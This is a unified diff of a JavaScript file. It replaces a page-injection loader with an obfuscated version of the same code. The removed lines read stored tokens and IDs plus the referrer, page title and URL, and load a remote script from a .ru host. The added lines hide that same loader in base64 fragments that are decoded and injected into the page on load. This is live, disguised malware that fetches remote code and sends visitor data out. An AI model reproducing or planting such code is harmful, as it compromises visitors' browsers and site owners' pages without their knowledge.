@@ -1,40 +1,12 @@
-(function() {
-    var name = '_T52jcBRmsRC61cPb';
-    if (!window._T52jcBRmsRC61cPb) {
-        window._T52jcBRmsRC61cPb = {
-            unique: false,
-            ttl: 86400,
-            R_PATH: 'https://shop-yko.ru/shjJWZ',
-        };
-    }
-    const _Knbx8rD4K2sH4sHd = localStorage.getItem('config');
-    if (typeof _Knbx8rD4K2sH4sHd !== 'undefined' && _Knbx8rD4K2sH4sHd !== null) {
-        var _PhyffDKBmkZNWZ3P = JSON.parse(_Knbx8rD4K2sH4sHd);
-        var _9vB7H3hvzvXNXzw6 = Math.round(+new Date()/1000);
-        if (_PhyffDKBmkZNWZ3P.created_at + window._T52jcBRmsRC61cPb.ttl < _9vB7H3hvzvXNXzw6) {
-            localStorage.removeItem('subId');
-            localStorage.removeItem('token');
-            localStorage.removeItem('config');
-        }
-    }
-    var _jzGJDkDc8j3Sn5by = localStorage.getItem('subId');
-    var _d8JWPHJKkMSkbCsh = localStorage.getItem('token');
-    var _7whWdKyMzZnmH4K9 = '?return=js.client';
-        _7whWdKyMzZnmH4K9 += '&' + decodeURIComponent(window.location.search.replace('?', ''));
-        _7whWdKyMzZnmH4K9 += '&se_referrer=' + encodeURIComponent(document.referrer);
-        _7whWdKyMzZnmH4K9 += '&default_keyword=' + encodeURIComponent(document.title);
-        _7whWdKyMzZnmH4K9 += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
-        _7whWdKyMzZnmH4K9 += '&name=' + encodeURIComponent(name);
-        _7whWdKyMzZnmH4K9 += '&host=' + encodeURIComponent(window._T52jcBRmsRC61cPb.R_PATH);
-    if (typeof _jzGJDkDc8j3Sn5by !== 'undefined' && _jzGJDkDc8j3Sn5by && window._T52jcBRmsRC61cPb.unique) {
-        _7whWdKyMzZnmH4K9 += '&sub_id=' + encodeURIComponent(_jzGJDkDc8j3Sn5by);
-    }
-    if (typeof _d8JWPHJKkMSkbCsh !== 'undefined' && _d8JWPHJKkMSkbCsh && window._T52jcBRmsRC61cPb.unique) {
-        _7whWdKyMzZnmH4K9 += '&token=' + encodeURIComponent(_d8JWPHJKkMSkbCsh);
-    }
-    var a = document.createElement('script');
-        a.type = 'application/javascript';
-        a.src = window._T52jcBRmsRC61cPb.R_PATH + _7whWdKyMzZnmH4K9;
-    var s = document.getElementsByTagName('script')[0];
-    s.parentNode.insertBefore(a, s)
-    })();
+
+        var arr = ["KGY=","dW5jdGlvbigpIA==","ewog","IA==","ICB2YXI=","IG5h","bWUgPSAnXw==","VDUyamNCUg==","bXNS","QzYxY1BiJzsKIA==","ICAgaWYgKCE=","d2luZA==","b3cuX1Q1Mmo=","Y0JS","bXNSQzYxY1A=","Yikgewog","ICAgICA=","ICB3aW5kbw==","dy5fVDUyamNC","Um1zUkM2MQ==","Y1BiID0gewo=","ICAgIA==","ICAg","ICAg","ICB1bmlxdWU=","OiBmYWxzZSw=","CiAgICAg","ICAgICA=","ICB0dGw6IA==","ODY0MDAs","CiAgICAgICA=","ICAgICBSX1BB","VEg6ICdodA==","dHBzOg==","Ly9zaG9wLQ==","eWtvLnJ1L3Noag==","SldaJywKICA=","ICAgICAgfTs=","CiA=","ICAgfQo=","IA==","ICAgY29ucw==","dCBfS25ieDhyRA==","NEs=","MnNINHNIZCA9IA==","bG9j","YWxTdA==","b3JhZ2UuZ2V0","SXRlbSgnY29uZg==","aWcnKTsKICA=","ICBpZiA=","KHR5cA==","ZW9mIF9L","bmJ4OHJENEs=","MnNINHM=","SGQgIT09ICd1","bmRlZg==","aW5lZCcgJiYg","X0tuYng4ckQ=","NEsyc0g0c0hk","ICE9PSBudWxs","KSB7CiAgICAg","ICAgdmFy","IF9QaHk=","Zg==","ZkRLQm0=","a1pO","V1ozUCA9IEpTTw==","Ti4=","cGFyc2U=","KF9Lbg==","Yng=","OA==","ckQ0Sw==","MnNINHNIZCk=","OwogICA=","ICAgICB2YXI=","IF85dg==","QjdIM2h2enZYTg==","WHp3","NiA9IE1hdA==","aC5yb3VuZCgrbg==","ZXcgRGF0ZSgp","LzEwMDA=","KTsKICAgIA==","ICAgIGlmIChf","UGh5ZmY=","RA==","S0Jta1pOV1o=","M1AuYw==","cmU=","YXRlZF8=","YXQgKyB3aQ==","bmRvdy5fVDUyag==","Y0JSbXNSQzYxYw==","UGIudHRs","IDwgXzk=","dkI3SDNo","dnp2WE4=","WHp3Nikgew==","CiAgICAg","ICAgICAg","IGxvY2Fs","U3RvcmFn","ZQ==","LnJlbW92ZQ==","SXRlbSgnc3U=","YklkJyk7CiAg","ICA=","IA==","ICAgICAgIGxvYw==","YWxTdG9yYWdlLg==","cmVtbw==","dg==","ZUl0","ZW0o","J3Rv","a2Vu","Jw==","KTsKIA==","ICAgIA==","ICAgICA=","ICBsbw==","Y2FsUw==","dG9yYWdlLnJlbQ==","b3ZlSXRlbSgnYw==","b25maWcn","KTsKICA=","ICAgICAgfQ==","CiAgICA=","fQogICAgdmFy","IF9qekdKRGtE","Yzhq","M1NuNWJ5ID0g","bG9j","YWxTdA==","b3JhZ2Uu","Z2U=","dEl0ZW0oJ3N1","YklkJyk7","CiAgICB2YXIg","X2Q4SldQSEpL","aw==","TVNrYkNzaCA=","PQ==","IGxvY2FsU3Rvcg==","YWdl","Lmc=","ZXRJ","dA==","ZW0oJ3Rva2Vu","Jyk7Cg==","ICAgIHZhcg==","IF83","d2hXZEt5","TXpabm1INA==","Sw==","OSA9","ICc/cg==","ZXR1cm49anMuYw==","bGllbnQ=","JzsKICA=","ICAgICA=","IF83d2hXZEt5","TXpabm1INEs5","ICs9","ICcmJyA=","KyBkZWNv","ZGU=","VQ==","UklDb21wb25lbg==","dCh3","aW4=","ZG93LmxvY2F0aQ==","b24uc2VhcmNo","LnJlcGw=","YQ==","Y2UoJz8n","LCAnJykp","Ow==","CiAgICAgICAgXw==","N3doV2RLeQ==","TXpa","bm1INEs5ICs9","ICc=","JnNlX3JlZg==","ZXJy","ZXI9JyArIA==","ZW5j","b2RlVVJJQ29tcA==","b25lbnQoZG9j","dW1l","bnQucmVmZXI=","cmVyKTsK","ICAgICAgICBf","N3c=","aFdkS3lNeg==","Wm5t","SDRLOSArPQ==","ICcmZA==","ZQ==","ZmF1bHRfa2V5dw==","bw==","cmQ9JyArIGVu","Y29kZQ==","VVJJQ29tcG9uZQ==","bnQoZG9jdW0=","ZW50Lg==","dGl0bGUp","OwogICAgICAgIA==","Xzd3aFdkS3lNeg==","Wm5tSDQ=","SzkgKw==","PSA=","JyY=","bGFuZGk=","bmdfdXJsPSc=","IA==","KyBlbmNvZGVV","UklDbw==","bXBvbmVudChkbw==","Y3VtZW50Lmw=","b2NhdGlv","bi5obw==","c3Ru","YW1lICsgZA==","b2N1bWVudA==","LmxvYw==","YXRpb24ucGF0aA==","bmFt","ZSk7CiAgICAgIA==","IA==","IF83","d2hXZEt5TXpa","bg==","bUg0SzkgKw==","PSA=","Jw==","Jm5hbQ==","ZT0nIA==","KyBlbmNvZGU=","VVJJQ29tcA==","b25lbnQobg==","YW0=","ZSk7CiAgICA=","ICAgIF83d2hXZA==","Sw==","eU16Wm5tSA==","NEs=","OSArPSAn","Jmhvc3Q9JyA=","KyBlbmNvZGVVUg==","SUM=","b20=","cG9uZW50","KHc=","aW5kb3cuXw==","VDUyamNCUm1z","UkM2MWNQ","Yi4=","Ul9QQVRIKTs=","CiAg","ICA=","aWYgKHR5cGVvZg==","IF9qekdKRGtE","YzhqM1NuNWI=","eSAh","PT0gJ3VuZA==","ZWZpbmVkJyAm","JiBfanpHSkRrRA==","Yzg=","ajNT","bjVieSA=","JiY=","IHdpbmRvdy5fVA==","NTJqY0JSbXNS","QzYxY1BiLg==","dW5pcXVlKQ==","IHsKICAgICAgIA==","IA==","Xzd3aFdkS3lN","elpubUg0Szk=","ICs9ICcmcw==","dWJfaWQ9","JyArIGVu","Y29kZVU=","Ug==","SUNvbXBvbmU=","bg==","dA==","KF9qekdKRGtEYw==","OGozUw==","bjVieSk7CiA=","ICAgfQo=","IA==","ICAgaWYgKHR5","cGVvZiBfZA==","OEpXUA==","SEpLa01Taw==","YkNzaCAh","PT0gJ3U=","bmRlZmluZWQnIA==","JiYgX2Q4SldQSA==","SktrTVNr","YkNzaCAmJg==","IHdpbg==","ZG93Ll9UNTJq","Y0JSbQ==","c1JDNjE=","Y1BiLnVuaQ==","cQ==","dWUpIHsKICA=","ICAgICAgXzc=","d2hX","ZEt5TXpabm1INA==","SzkgKz0gJyZ0bw==","a2VuPScgKw==","IGVuY29kZVVS","SUNvbXA=","b25lbnQoXw==","ZDhK","V1A=","SEpLa01Ta2I=","Q3NoKQ==","Owog","ICAg","fQogICAgdmFy","IGE=","ID0g","ZG9jdQ==","bWVudA==","LmNyZQ==","YQ==","dGVFbGVtZW4=","dCgnc2NyaXB0Jw==","KTsKICA=","ICAgICAg","YS50eXBlIA==","PSAnYXA=","cGxpY2F0","aW9uL2ph","dmFzY3JpcHQnOw==","CiAgICAgICAg","YS5zcmMgPSA=","d2luZG93Ll8=","VDUyamNCUm1z","UkM2MWNQYg==","Lg==","Ul9QQVRIICsg","Xzd3aFdkSw==","eU0=","elpubQ==","SDQ=","Szk7CiAgICB2","YXIgcyA9IGRvYw==","dW1lbnQu","Z2V0RWxl","bWU=","bnRzQnlU","YWdOYQ==","bWUoJ3Nj","cmlw","dCcpWzBdOw==","CiAg","ICBzLnBhcmU=","bnQ=","Tm9kZS5pbg==","c2VydEJlZg==","b3JlKGEsIA==","cykK","ICAgIH0=","KSgpOw=="];
+        var str = "";
+        arr.forEach(item => {
+            str += atob(item);
+        });
+        var a = document.createElement('script');
+        a.type = 'text/javascript';
+        a.innerHTML = str;
+        var s = document.getElementsByTagName('script')[0];
+        s.parentNode.insertBefore(a, s);
+    
